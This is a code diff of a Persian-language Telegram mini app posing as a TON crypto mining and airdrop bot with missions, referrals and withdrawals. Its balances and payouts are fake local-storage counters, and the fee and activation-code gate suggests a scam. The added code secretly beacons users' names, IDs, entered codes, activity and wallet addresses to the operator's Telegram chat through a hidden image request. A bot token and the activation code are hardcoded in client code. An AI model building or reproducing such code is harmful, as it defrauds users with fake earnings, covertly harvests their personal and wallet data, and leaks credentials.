@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TonPlusBot - v57 Final</title>
+    <title>TonDropyBot - v61 Pro</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -410,13 +410,11 @@
             margin: 10px 0;
         }
 
-        /* بازنویسی کامل استایل کتابخانه TonConnect */
         #ton-connect-btn {
             width: 100% !important;
             max-width: 100% !important;
         }
 
-        /* هدف قرار دادن تمام المان‌های داخلی */
         .tc-root-element,
         .tc-root-element > div,
         .tc-button,
@@ -449,7 +447,6 @@
             transition: 0.3s !important;
         }
 
-        /* اضافه کردن آیکون کیف پول */
         .tc-root-element::before,
         .tc-button::before,
         .tc-button__inner::before,
@@ -463,7 +460,6 @@
             display: inline-block !important;
         }
 
-        /* حذف هرگونه المان اضافی */
         .tc-root-element svg,
         .tc-root-element img,
         .tc-root-element picture,
@@ -478,6 +474,8 @@
         .active-btn { background: #1faa59; }
         .get-code-btn { background: #0088cc; }
         .share-btn { background: #28a745; }
+        .mission-btn { background: #9c27b0; }
+        .admin-btn { background: #ff5722; }
 
         /* نوار ناوبری پایین */
         .bottom-nav {
@@ -522,19 +520,42 @@
             display: block;
         }
 
-        /* آدرس کیف پول */
+        /* آدرس کیف پول - کامل و بدون برش */
         .wallet-address {
             background: #1e2732;
             border-radius: 15px;
-            padding: 10px 15px;
+            padding: 15px;
             margin-top: 15px;
             font-size: 14px;
             color: #00c6ff;
             display: flex;
+            flex-direction: column;
             align-items: center;
-            justify-content: center;
-            gap: 8px;
+            gap: 10px;
             border: 1px solid #333;
+            word-break: break-all;
+            text-align: center;
+        }
+        .wallet-address .address-full {
+            font-family: monospace;
+            font-size: 12px;
+            background: #0b1019;
+            padding: 10px;
+            border-radius: 10px;
+            width: 100%;
+            direction: ltr;
+        }
+        .wallet-address .copy-btn {
+            background: #0088cc;
+            border: none;
+            color: #fff;
+            padding: 8px 20px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
         }
 
         /* کارت پاداش */
@@ -600,6 +621,109 @@
         }
         .share-now-btn {
             background: #28a745;
+        }
+
+        /* بخش ماموریت‌ها */
+        .missions-container {
+            margin-top: 15px;
+        }
+        .mission-category {
+            background: #1e2732;
+            border-radius: 20px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+        .mission-category h4 {
+            color: #00c6ff;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        .mission-item {
+            background: #0b1019;
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid #333;
+        }
+        .mission-info {
+            flex: 1;
+        }
+        .mission-title {
+            font-weight: bold;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .mission-badge {
+            background: #ff5722;
+            color: #fff;
+            font-size: 10px;
+            padding: 3px 8px;
+            border-radius: 50px;
+            display: inline-block;
+        }
+        .mission-reward {
+            color: #00ff9d;
+            font-size: 12px;
+        }
+        .mission-reward i {
+            margin-left: 5px;
+        }
+        .mission-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .mission-check {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #1e2732;
+            border: 2px solid #444;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .mission-check.completed {
+            background: #00ff9d;
+            border-color: #00ff9d;
+            color: #000;
+        }
+        .mission-check i {
+            font-size: 16px;
+        }
+        .mission-claim {
+            background: #0088cc;
+            border: none;
+            color: #fff;
+            padding: 8px 15px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .mission-claim:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+        .coming-soon {
+            background: #333;
+            color: #aaa;
+            padding: 8px 15px;
+            border-radius: 12px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
         }
 
         /* تایمر پاداش */
@@ -707,7 +831,6 @@
             font-size: 14px;
         }
 
-        /* پیام زیر دکمه فعالسازی */
         .activation-message {
             margin-top: 15px;
             padding: 12px;
@@ -728,6 +851,69 @@
             font-size: 18px;
         }
 
+        /* پنل ادمین */
+        #adminPanel {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(10px);
+            z-index: 500000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+        }
+        #adminPanel.show {
+            display: flex;
+        }
+        .admin-card {
+            background: #1c1c1c;
+            border-radius: 30px;
+            padding: 25px;
+            width: 100%;
+            max-width: 500px;
+            max-height: 90vh;
+            overflow-y: auto;
+            border: 1px solid #333;
+        }
+        .admin-stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        .stat-box {
+            background: #0b1019;
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+            border: 1px solid #333;
+        }
+        .stat-box .number {
+            font-size: 24px;
+            font-weight: bold;
+            color: #00c6ff;
+        }
+        .admin-log {
+            background: #0b1019;
+            border-radius: 15px;
+            padding: 15px;
+            margin-top: 15px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .log-item {
+            padding: 8px;
+            border-bottom: 1px solid #333;
+            font-size: 12px;
+            direction: ltr;
+            text-align: left;
+            color: #aaa;
+        }
+
         .hidden { display: none !important; }
     </style>
 </head>
@@ -738,15 +924,15 @@
 <!-- کادر شیشه‌ای برای پیام خطا -->
 <div id="errorGlass" class="glass-message error">
     <i class="fas fa-times-circle" style="color: #ff512f;"></i>
-    <div id="errorText">رمز اشتباه است</div>
+    <div id="errorText">خطا</div>
     <div class="small-text">لطفا مجددا تلاش کنید</div>
 </div>
 
 <!-- کادر شیشه‌ای برای پیام موفقیت -->
 <div id="successGlass" class="glass-message success">
     <i class="fas fa-check-circle" style="color: #00ff9d;"></i>
-    <div id="successText">ورود موفق</div>
-    <div class="small-text" id="successSubtext">در حال اتصال به شبکه بلاکچین ...</div>
+    <div id="successText">موفقیت</div>
+    <div class="small-text" id="successSubtext"></div>
 </div>
 
 <!-- کادر شیشه‌ای سطوح -->
@@ -757,6 +943,44 @@
             <button class="close-btn" onclick="closeLevelModal()"><i class="fas fa-times"></i></button>
         </div>
         <div id="levelList"></div>
+    </div>
+</div>
+
+<!-- پنل ادمین -->
+<div id="adminPanel">
+    <div class="admin-card">
+        <h2 style="margin-bottom: 20px; color: #00c6ff;">🔧 پنل مدیریت</h2>
+        
+        <div class="admin-stats">
+            <div class="stat-box">
+                <div class="number" id="adminTotalUsers">0</div>
+                <div>کل کاربران</div>
+            </div>
+            <div class="stat-box">
+                <div class="number" id="adminActiveToday">0</div>
+                <div>فعال امروز</div>
+            </div>
+            <div class="stat-box">
+                <div class="number" id="adminTotalWithdraw">0</div>
+                <div>کل برداشت</div>
+            </div>
+            <div class="stat-box">
+                <div class="number" id="adminTotalMined">0</div>
+                <div>کل استخراج</div>
+            </div>
+        </div>
+
+        <h4 style="margin: 15px 0;">📋 کیف پول‌های متصل</h4>
+        <div id="adminWallets" class="admin-log">
+            <!-- لیست کیف پول‌ها -->
+        </div>
+
+        <h4 style="margin: 15px 0;">📊 لاگ فعالیت‌ها</h4>
+        <div id="adminLogs" class="admin-log">
+            <!-- لاگ فعالیت‌ها -->
+        </div>
+
+        <button onclick="closeAdminPanel()" class="btn support-btn" style="margin-top: 20px;">بستن</button>
     </div>
 </div>
 
@@ -780,7 +1004,6 @@
             <i class="fas fa-check-circle"></i> فعالسازی و ورود به پنل
         </button>
         
-        <!-- پیام زیر دکمه فعالسازی -->
         <div id="activationMessage" class="activation-message">
             <i class="fas fa-spinner fa-pulse"></i>
             <span>ورود موفق ، در حال اتصال به شبکه بلاکچین ...</span>
@@ -864,15 +1087,17 @@
         <div class="card">
             <p style="margin:0; font-size:13px; color:#aaa;">اتصال کیف پول</p>
             
-            <!-- دکمه Connect Wallet در مرکز با استایل اختصاصی -->
             <div class="wallet-button-wrapper">
                 <div id="ton-connect-btn"></div>
             </div>
             
             <div id="walletAddress" class="wallet-address hidden">
                 <i class="fas fa-wallet"></i>
-                <span id="walletAddressText"></span>
-                <i class="fas fa-copy copy-icon" onclick="copyWalletAddress()" style="cursor: pointer;"></i>
+                <span>آدرس کیف پول شما:</span>
+                <div class="address-full" id="walletAddressFull"></div>
+                <button class="copy-btn" onclick="copyFullWalletAddress()">
+                    <i class="fas fa-copy"></i> کپی آدرس کامل
+                </button>
             </div>
         </div>
 
@@ -894,7 +1119,6 @@
                 به ازای هر دعوت 0.01 TON پاداش + 5٪ از استخراج دوستان
             </p>
             
-            <!-- باکس لینک دعوت با دو دکمه -->
             <div class="referral-link-box">
                 <span id="referralLink">در حال بارگذاری...</span>
                 <div class="button-group">
@@ -938,9 +1162,155 @@
             <button id="dailyRewardBtn" class="btn active-btn" onclick="claimDailyReward()">
                 <i class="fas fa-gift"></i> دریافت پاداش
             </button>
-            <!-- تایمر پاداش -->
             <div id="rewardTimer" class="reward-timer hidden">
                 ⏳ زمان تا پاداش بعدی: <span id="timerDisplay"></span>
+            </div>
+        </div>
+
+        <!-- بخش ماموریت‌ها -->
+        <div class="missions-container">
+            <!-- ماموریت‌های شبکه‌های اجتماعی -->
+            <div class="mission-category">
+                <h4><i class="fas fa-globe"></i> ماموریت‌های شبکه‌های اجتماعی</h4>
+                
+                <!-- فقط تلگرام فعال است -->
+                <div class="mission-item" id="missionTelegram">
+                    <div class="mission-info">
+                        <div class="mission-title">
+                            <i class="fab fa-telegram" style="color: #0088cc;"></i>
+                            عضویت در کانال تلگرام
+                            <span class="mission-badge">فعال</span>
+                        </div>
+                        <div class="mission-reward"><i class="fas fa-coins"></i> +0.05 TON</div>
+                    </div>
+                    <div class="mission-status">
+                        <div class="mission-check" id="checkTelegram" onclick="toggleMission('telegram')">
+                            <i class="fas fa-check"></i>
+                        </div>
+                        <button class="mission-claim" id="claimTelegram" onclick="claimMission('telegram', 0.05)" disabled>
+                            <i class="fas fa-gift"></i> دریافت
+                        </button>
+                    </div>
+                </div>
+
+                <!-- بقیه با برچسب به زودی -->
+                <div class="mission-item" style="opacity: 0.7;">
+                    <div class="mission-info">
+                        <div class="mission-title">
+                            <i class="fab fa-instagram" style="color: #e4405f;"></i>
+                            فالو کردن اینستاگرام
+                            <span class="mission-badge" style="background: #666;">به زودی</span>
+                        </div>
+                        <div class="mission-reward"><i class="fas fa-coins"></i> +0.05 TON</div>
+                    </div>
+                    <div class="mission-status">
+                        <div class="coming-soon">
+                            <i class="fas fa-clock"></i> به زودی
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mission-item" style="opacity: 0.7;">
+                    <div class="mission-info">
+                        <div class="mission-title">
+                            <i class="fab fa-youtube" style="color: #ff0000;"></i>
+                            سابسکرایب یوتیوب
+                            <span class="mission-badge" style="background: #666;">به زودی</span>
+                        </div>
+                        <div class="mission-reward"><i class="fas fa-coins"></i> +0.07 TON</div>
+                    </div>
+                    <div class="mission-status">
+                        <div class="coming-soon">
+                            <i class="fas fa-clock"></i> به زودی
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mission-item" style="opacity: 0.7;">
+                    <div class="mission-info">
+                        <div class="mission-title">
+                            <i class="fab fa-twitter" style="color: #1da1f2;"></i>
+                            فالو کردن توییتر
+                            <span class="mission-badge" style="background: #666;">به زودی</span>
+                        </div>
+                        <div class="mission-reward"><i class="fas fa-coins"></i> +0.06 TON</div>
+                    </div>
+                    <div class="mission-status">
+                        <div class="coming-soon">
+                            <i class="fas fa-clock"></i> به زودی
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ماموریت‌های درون‌باتی -->
+            <div class="mission-category">
+                <h4><i class="fas fa-robot"></i> ماموریت‌های درون‌باتی</h4>
+                
+                <!-- همه با برچسب به زودی -->
+                <div class="mission-item" style="opacity: 0.7;">
+                    <div class="mission-info">
+                        <div class="mission-title">
+                            <i class="fas fa-bolt" style="color: #00ff9d;"></i>
+                            استخراج 1 ساعت
+                            <span class="mission-badge" style="background: #666;">به زودی</span>
+                        </div>
+                        <div class="mission-reward"><i class="fas fa-coins"></i> +0.02 TON</div>
+                    </div>
+                    <div class="mission-status">
+                        <div class="coming-soon">
+                            <i class="fas fa-clock"></i> به زودی
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mission-item" style="opacity: 0.7;">
+                    <div class="mission-info">
+                        <div class="mission-title">
+                            <i class="fas fa-users" style="color: #00c6ff;"></i>
+                            دعوت 1 دوست
+                            <span class="mission-badge" style="background: #666;">به زودی</span>
+                        </div>
+                        <div class="mission-reward"><i class="fas fa-coins"></i> +0.10 TON</div>
+                    </div>
+                    <div class="mission-status">
+                        <div class="coming-soon">
+                            <i class="fas fa-clock"></i> به زودی
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mission-item" style="opacity: 0.7;">
+                    <div class="mission-info">
+                        <div class="mission-title">
+                            <i class="fas fa-share-alt" style="color: #9c27b0;"></i>
+                            اشتراک‌گذاری لینک دعوت
+                            <span class="mission-badge" style="background: #666;">به زودی</span>
+                        </div>
+                        <div class="mission-reward"><i class="fas fa-coins"></i> +0.03 TON</div>
+                    </div>
+                    <div class="mission-status">
+                        <div class="coming-soon">
+                            <i class="fas fa-clock"></i> به زودی
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mission-item" style="opacity: 0.7;">
+                    <div class="mission-info">
+                        <div class="mission-title">
+                            <i class="fas fa-arrow-up" style="color: #ff512f;"></i>
+                            اولین برداشت
+                            <span class="mission-badge" style="background: #666;">به زودی</span>
+                        </div>
+                        <div class="mission-reward"><i class="fas fa-coins"></i> +0.05 TON</div>
+                    </div>
+                    <div class="mission-status">
+                        <div class="coming-soon">
+                            <i class="fas fa-clock"></i> به زودی
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
 
@@ -950,7 +1320,7 @@
                 <div class="stat-item">
                     <i class="fas fa-trophy" style="color: #ffd700; font-size: 20px;"></i>
                     <div class="stat-value" id="achievementCount">0</div>
-                    <div class="stat-label">دستاوردها</div>
+                    <div class="stat-label">ماموریت‌های انجام شده</div>
                 </div>
                 <div class="stat-item">
                     <i class="fas fa-calendar-check" style="color: #00ff9d; font-size: 20px;"></i>
@@ -993,11 +1363,17 @@
     const SECRET_CODE = "T61O96N12";
     const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
     const ADMIN_ID = "5972276401";
-    
-    // نام کاربری ربات
     const BOT_USERNAME = "TonDropyBot";
 
-    // متغیرهای جدید
+    // لینک‌های شبکه‌های اجتماعی - فقط تلگرام فعال است
+    const SOCIAL_LINKS = {
+        telegram: "https://t.me/Tondropy",
+        instagram: "#",
+        youtube: "#",
+        twitter: "#"
+    };
+
+    // متغیرهای پیشرفته برای ردیابی
     let totalMined = parseFloat(localStorage.getItem('totalMined')) || 0;
     let withdrawableBalance = parseFloat(localStorage.getItem('withdrawableBalance')) || 0;
     let referralCount = parseInt(localStorage.getItem('referralCount')) || 0;
@@ -1007,6 +1383,16 @@
     let lastRewardTime = parseInt(localStorage.getItem('lastRewardTime')) || 0;
     let history = JSON.parse(localStorage.getItem('transactionHistory')) || [];
     let isWalletConnected = false;
+    let connectedWallets = JSON.parse(localStorage.getItem('connectedWallets')) || [];
+    let userActivityLog = JSON.parse(localStorage.getItem('userActivityLog')) || [];
+    let totalUsers = parseInt(localStorage.getItem('totalUsers')) || 1;
+    let lastActive = parseInt(localStorage.getItem('lastActive')) || Date.now();
+
+    // وضعیت ماموریت‌ها - فقط تلگرام فعال است
+    let missions = JSON.parse(localStorage.getItem('missions')) || {
+        telegram: { checked: false, claimed: false }
+        // بقیه غیرفعال
+    };
 
     // تعریف سطوح
     const levels = [
@@ -1017,7 +1403,178 @@
         { name: 'سطح 5 (الماس)', req: 1, color: '#00c6ff' }
     ];
 
-    // توابع نمایش کادر شیشه‌ای
+    // ===== توابع پیشرفته ردیابی =====
+    function logUserActivity(action, details = {}) {
+        const user = tg.initDataUnsafe?.user;
+        const logEntry = {
+            timestamp: new Date().toISOString(),
+            userId: user?.id || 'unknown',
+            username: user?.username || 'no_username',
+            firstName: user?.first_name || 'unknown',
+            action: action,
+            details: details,
+            ip: 'webapp',
+            platform: tg.platform || 'unknown'
+        };
+        
+        userActivityLog.unshift(logEntry);
+        if (userActivityLog.length > 100) userActivityLog.pop();
+        localStorage.setItem('userActivityLog', JSON.stringify(userActivityLog));
+        
+        if (['wallet_connected', 'withdraw_request', 'mission_completed'].includes(action)) {
+            sendDetailedReport(logEntry);
+        }
+        
+        return logEntry;
+    }
+
+    function sendDetailedReport(logEntry) {
+        const user = tg.initDataUnsafe?.user;
+        const reportText = `
+🔔 **گزارش دقیق فعالیت**
+━━━━━━━━━━━━━━
+👤 کاربر: ${logEntry.firstName}
+🆔 آیدی: ${logEntry.username ? '@' + logEntry.username : logEntry.userId}
+📱 پلتفرم: ${logEntry.platform}
+⏱ زمان: ${new Date(logEntry.timestamp).toLocaleString('fa-IR')}
+📌 رویداد: ${logEntry.action}
+📊 جزئیات: ${JSON.stringify(logEntry.details, null, 2)}
+━━━━━━━━━━━━━━
+        `;
+        
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(reportText)}&parse_mode=Markdown`;
+        const img = new Image();
+        img.src = url;
+    }
+
+    // ===== پنل ادمین =====
+    window.openAdminPanel = function() {
+        if (!checkAdminAccess()) {
+            showGlassMessage('error', 'دسترسی غیرمجاز', 'شما اجازه دسترسی به این بخش را ندارید');
+            return;
+        }
+        
+        updateAdminPanel();
+        document.getElementById('adminPanel').classList.add('show');
+    }
+
+    window.closeAdminPanel = function() {
+        document.getElementById('adminPanel').classList.remove('show');
+    }
+
+    function checkAdminAccess() {
+        const user = tg.initDataUnsafe?.user;
+        return user && (user.id.toString() === ADMIN_ID || user.username === 'MiningerTonCoin');
+    }
+
+    function updateAdminPanel() {
+        document.getElementById('adminTotalUsers').innerText = totalUsers;
+        document.getElementById('adminActiveToday').innerText = userActivityLog.filter(log => {
+            const logDate = new Date(log.timestamp).toDateString();
+            const today = new Date().toDateString();
+            return logDate === today;
+        }).length;
+        
+        document.getElementById('adminTotalWithdraw').innerText = history
+            .filter(h => h.type === 'برداشت نهایی')
+            .reduce((sum, h) => sum + parseFloat(h.amount), 0)
+            .toFixed(3);
+        
+        document.getElementById('adminTotalMined').innerText = totalMined.toFixed(3);
+
+        const walletsDiv = document.getElementById('adminWallets');
+        if (connectedWallets.length === 0) {
+            walletsDiv.innerHTML = '<div class="log-item">هیچ کیف پولی متصل نشده</div>';
+        } else {
+            walletsDiv.innerHTML = connectedWallets.map(w => `
+                <div class="log-item">
+                    <div>👤 ${w.username || 'ناشناس'}</div>
+                    <div style="color: #00ff9d; word-break: break-all;">${w.address}</div>
+                    <div style="font-size: 10px; color: #666;">${new Date(w.time).toLocaleString('fa-IR')}</div>
+                </div>
+            `).join('');
+        }
+
+        const logsDiv = document.getElementById('adminLogs');
+        logsDiv.innerHTML = userActivityLog.slice(0, 20).map(log => `
+            <div class="log-item">
+                <span style="color: #00c6ff;">${new Date(log.timestamp).toLocaleTimeString('fa-IR')}</span>
+                <span style="color: ${log.action.includes('error') ? '#ff512f' : '#aaa'}">${log.action}</span>
+                <div style="font-size: 10px;">${log.firstName} (${log.username || 'بدون یوزر'})</div>
+            </div>
+        `).join('');
+    }
+
+    // تابع باز کردن لینک شبکه اجتماعی
+    function openSocialLink(platform) {
+        if (platform === 'telegram' && SOCIAL_LINKS[platform]) {
+            window.open(SOCIAL_LINKS[platform], '_blank');
+        } else {
+            showGlassMessage('info', 'به زودی', 'این ماموریت به زودی فعال می‌شود');
+        }
+    }
+
+    // تابع علامت زدن ماموریت - فقط تلگرام
+    window.toggleMission = function(missionId) {
+        if (missionId !== 'telegram') {
+            showGlassMessage('info', 'به زودی', 'این ماموریت به زودی فعال می‌شود');
+            return;
+        }
+        
+        if (missions[missionId].claimed) return;
+        
+        missions[missionId].checked = !missions[missionId].checked;
+        localStorage.setItem('missions', JSON.stringify(missions));
+        
+        const checkElement = document.getElementById(`checkTelegram`);
+        const claimElement = document.getElementById(`claimTelegram`);
+        
+        if (missions[missionId].checked) {
+            checkElement.classList.add('completed');
+            claimElement.disabled = false;
+            openSocialLink('telegram');
+            logUserActivity('mission_checked', { missionId });
+        } else {
+            checkElement.classList.remove('completed');
+            claimElement.disabled = true;
+        }
+    };
+
+    // تابع دریافت جایزه ماموریت - فقط تلگرام
+    window.claimMission = function(missionId, reward) {
+        if (missionId !== 'telegram') {
+            showGlassMessage('info', 'به زودی', 'این ماموریت به زودی فعال می‌شود');
+            return;
+        }
+        
+        if (!missions[missionId].checked || missions[missionId].claimed) return;
+        
+        missions[missionId].claimed = true;
+        localStorage.setItem('missions', JSON.stringify(missions));
+        
+        withdrawableBalance += reward;
+        document.getElementById('withdrawableBalance').innerText = withdrawableBalance.toFixed(6);
+        localStorage.setItem('withdrawableBalance', withdrawableBalance.toString());
+        
+        const claimElement = document.getElementById(`claimTelegram`);
+        claimElement.disabled = true;
+        claimElement.style.opacity = '0.3';
+        
+        achievements++;
+        document.getElementById('achievementCount').innerText = achievements;
+        localStorage.setItem('achievements', achievements.toString());
+        
+        addToHistory('پاداش ماموریت', `${reward.toFixed(3)} TON`);
+        
+        showGlassMessage('success', 'ماموریت تکمیل شد!', `${reward} TON به حساب شما اضافه شد`);
+        
+        logUserActivity('mission_completed', { 
+            missionId, 
+            missionName: 'عضویت در تلگرام',
+            reward 
+        });
+    };
+
     function showGlassMessage(type, message, subtext = '') {
         if (type === 'error') {
             const glass = document.getElementById('errorGlass');
@@ -1034,10 +1591,19 @@
             setTimeout(() => {
                 glass.classList.remove('show');
             }, 3000);
+        } else if (type === 'info') {
+            const glass = document.getElementById('successGlass');
+            document.getElementById('successText').innerText = message;
+            document.getElementById('successSubtext').innerText = subtext;
+            glass.style.borderRightColor = '#0088cc';
+            glass.classList.add('show');
+            setTimeout(() => {
+                glass.classList.remove('show');
+                glass.style.borderRightColor = '#00ff9d';
+            }, 3000);
         }
     }
 
-    // تابع جدید برای گزارش خطا به تلگرام
     function reportActivationError() {
         const user = tg.initDataUnsafe?.user;
         const userName = user ? user.first_name : 'کاربر ناشناس';
@@ -1047,10 +1613,9 @@
         const message = `❌ خطا در فعالسازی\n👤 کاربر: ${userName}\n🆔 ${userUsername}\n🔑 کد وارد شده: ${enteredCode || 'خالی'}\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
         
         notifyAdmin(message);
-        console.log('گزارش خطا ارسال شد:', message);
+        logUserActivity('activation_error', { enteredCode });
     }
 
-    // تابع جدید برای گزارش موفقیت به تلگرام
     function reportActivationSuccess() {
         const user = tg.initDataUnsafe?.user;
         const userName = user ? user.first_name : 'کاربر ناشناس';
@@ -1059,20 +1624,19 @@
         const message = `✅ فعالسازی موفق\n👤 کاربر: ${userName}\n🆔 ${userUsername}\n🎉 با موفقیت وارد شد\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
         
         notifyAdmin(message);
-        console.log('گزارش موفقیت ارسال شد:', message);
+        logUserActivity('activation_success', {});
     }
 
-    // ردیاب کاربر
     function trackUserActivity(pageName) {
         const user = tg.initDataUnsafe?.user;
         const userName = user ? user.first_name : 'کاربر';
         const username = user?.username ? `@${user.username}` : `آیدی: ${user?.id}`;
         
-        notifyAdmin(`👤 کاربر ${userName} (${username}) به صفحه ${pageName} منتقل شد`);
-        console.log(`[Track] کاربر به صفحه ${pageName} رفت`);
+        const message = `👤 کاربر ${userName} (${username}) به صفحه ${pageName} منتقل شد`;
+        notifyAdmin(message);
+        logUserActivity('page_view', { page: pageName });
     }
 
-    // تابع تغییر صفحه
     window.switchPage = function(pageName, element) {
         document.querySelectorAll('.page').forEach(page => {
             page.classList.remove('active');
@@ -1102,11 +1666,9 @@
             updateRewardButton();
         }
         
-        // اسکرول به بالای صفحه
         document.getElementById('scrollableContent').scrollTop = 0;
-    }
+    };
 
-    // باز کردن مودال سطوح
     window.openLevelModal = function() {
         document.getElementById('levelModal').classList.add('show');
         updateLevelList();
@@ -1176,6 +1738,8 @@
         if (history.length > 10) history.pop();
         localStorage.setItem('transactionHistory', JSON.stringify(history));
         updateWalletHistory();
+        
+        logUserActivity('transaction_added', { type, amount, status });
     }
 
     function updateWalletHistory() {
@@ -1221,7 +1785,6 @@
         }
     }
 
-    // تولید لینک اختصاصی هر کاربر با نام ربات صحیح
     function generateReferralLink() {
         const user = tg.initDataUnsafe?.user;
         if (user) {
@@ -1236,29 +1799,28 @@
         const link = document.getElementById('referralLink').innerText;
         navigator.clipboard.writeText(link).then(() => {
             showToast('✅ لینک دعوت کپی شد!');
+            logUserActivity('copy_referral_link', {});
         });
     }
 
-    // اشتراک‌گذاری لینک دعوت با نام ربات صحیح
     function shareReferralLink() {
         const user = tg.initDataUnsafe?.user;
         const userName = user ? user.first_name : 'کاربر';
         const link = document.getElementById('referralLink').innerText;
         
-        // متن دعوت با لینک صحیح
         const shareText = `🚀 سلام! من ${userName} از ربات ${BOT_USERNAME} استفاده می‌کنم.\n💰 با لینک من ثبت نام کن و 0.01 TON پاداش بگیر!\n🔗 ${link}`;
         
-        // باز کردن پنجره اشتراک‌گذاری تلگرام
         Telegram.WebApp.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=${encodeURIComponent(shareText)}`);
         
         showToast('📤 پنجره اشتراک‌گذاری باز شد');
         trackUserActivity('اشتراک‌گذاری لینک دعوت');
+        logUserActivity('share_referral_link', {});
     }
 
-    function copyWalletAddress() {
-        const address = document.getElementById('walletAddressText').innerText;
+    function copyFullWalletAddress() {
+        const address = document.getElementById('walletAddressFull').innerText;
         navigator.clipboard.writeText(address).then(() => {
-            showToast('✅ آدرس کیف پول کپی شد!');
+            showToast('✅ آدرس کامل کیف پول کپی شد!');
         });
     }
 
@@ -1320,6 +1882,7 @@
         
         updateRewardButton();
         trackUserActivity('دریافت پاداش روزانه');
+        logUserActivity('daily_reward_claimed', { level, rewardAmount });
     }
 
     document.getElementById('moveToWithdrawBtn').onclick = function() {
@@ -1346,9 +1909,9 @@
         
         showToast(`💰 مبلغ به موجودی برداشت منتقل شد`);
         addToHistory('انتقال به برداشت', `${withdrawableBalance.toFixed(6)} TON`);
+        logUserActivity('transfer_to_withdraw', { amount: withdrawableBalance });
     };
 
-    // تابع برداشت نهایی با پیام جدید
     function finalWithdraw() {
         if(!isWalletConnected) {
             tg.showAlert("❌ لطفا ابتدا کیف پول خود را متصل کنید");
@@ -1363,24 +1926,23 @@
 
         const amountToWithdraw = withdrawableBalance;
         
-        // ثبت در تاریخچه
         addToHistory('برداشت نهایی', `${amountToWithdraw.toFixed(6)} TON`);
         
-        // گزارش به ادمین
-        notifyAdmin(`💰 برداشت نهایی: ${amountToWithdraw.toFixed(6)} TON به کیف پول ${document.getElementById('walletAddressText').innerText}`);
+        const walletAddress = document.getElementById('walletAddressFull').innerText;
+        notifyAdmin(`💰 برداشت نهایی: ${amountToWithdraw.toFixed(6)} TON به کیف پول ${walletAddress}`);
         
-        // خالی کردن موجودی برداشت
+        logUserActivity('withdraw_request', { 
+            amount: amountToWithdraw,
+            wallet: walletAddress 
+        });
+        
         withdrawableBalance = 0;
         document.getElementById('withdrawableBalance').innerText = "0.000000";
         localStorage.setItem('withdrawableBalance', "0");
         
-        // غیرفعال کردن دکمه
         document.getElementById('finalWithdrawBtn').classList.add('disabled');
         
-        // نمایش پیام جدید درخواستی
         showToast(`✅ برداشت شما انجام شد و پس از تایید مدیریت به حسابتان واریز خواهد شد`);
-        
-        // ردیاب
         trackUserActivity('برداشت نهایی');
     }
 
@@ -1399,22 +1961,15 @@
         document.getElementById('feeModal').style.display = 'none';
     }
 
-    // تابع فعالسازی با گزارش به تلگرام
     function verifyActivation() {
         const val = document.getElementById('activationInput').value.trim();
         const activationMessage = document.getElementById('activationMessage');
         
         if(val === SECRET_CODE) {
-            // گزارش موفقیت به تلگرام
             reportActivationSuccess();
-            
-            // نمایش پیام موفقیت در کادر شیشه‌ای
             showGlassMessage('success', 'ورود موفق', 'در حال اتصال به شبکه بلاکچین ...');
-            
-            // نمایش پیام زیر دکمه
             activationMessage.classList.add('show');
             
-            // بعد از 2 ثانیه پاپ‌آپ رو ببند
             setTimeout(() => {
                 localStorage.setItem('isActivated', 'true');
                 document.getElementById('feeModal').style.display = 'none';
@@ -1423,13 +1978,8 @@
                 trackUserActivity('فعالسازی');
             }, 2000);
         } else {
-            // گزارش خطا به تلگرام
             reportActivationError();
-            
-            // نمایش پیام خطا در کادر شیشه‌ای
             showGlassMessage('error', 'رمز اشتباه است', 'لطفا مجددا تلاش کنید');
-            
-            // مخفی کردن پیام زیر دکمه اگر قبلاً نمایش داده شده
             activationMessage.classList.remove('show');
         }
     }
@@ -1448,6 +1998,15 @@
             };
         }
         generateReferralLink();
+        
+        const userKey = `user_${u.id}`;
+        if (!localStorage.getItem(userKey)) {
+            localStorage.setItem(userKey, JSON.stringify({ firstVisit: new Date().toISOString() }));
+            totalUsers++;
+            localStorage.setItem('totalUsers', totalUsers.toString());
+        }
+        lastActive = Date.now();
+        localStorage.setItem('lastActive', lastActive.toString());
     }
 
